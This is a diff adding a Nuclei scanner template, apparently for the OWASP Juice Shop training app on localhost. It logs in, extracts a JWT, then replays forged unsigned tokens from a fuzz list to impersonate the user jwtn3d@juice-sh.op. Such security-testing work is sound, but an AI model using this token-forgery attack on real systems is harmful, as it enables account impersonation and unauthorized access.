@@ -1,0 +1,62 @@
+id: unsigned_jwt_Vulnerable and outdated components
+
+info:
+  name: Unsigned JWT Automation
+  author: your_name
+  severity: info
+  description: Automating JWT token manipulation to test for unsigned JWT vulnerability.
+
+
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"trycyber@gmail.com","password":"trycyber"}
+
+    extractors:
+      - type: regex
+        name: jwt_token
+        internal: true
+        group: 1
+        regex:
+          - '"token"\s*:\s*"([^"]+)"'
+
+  - raw:
+      - |
+        GET /rest/user/whoami HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Authorization: Bearer {{final_payload}}
+        Cookie: language=en; token={{final_payload}}
+
+    attack: Pitchfork
+    payloads:
+        final_payload: /home/parrot/nuclei-templates/http/vulnerabilities/juice-shop/Vulnerable-Components/fuzz_jwt.txt
+       
+    stop-at-first-match: true
+
+
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "jwtn3d@juice-sh.op"
+        part: body  
+        
+    extractors:
+      - type: regex
+        name: "found_email"
+        regex:
+          - '"([a-zA-Z0-9._%+-]+@juice-sh\.op)"'
+        part: body
+
+
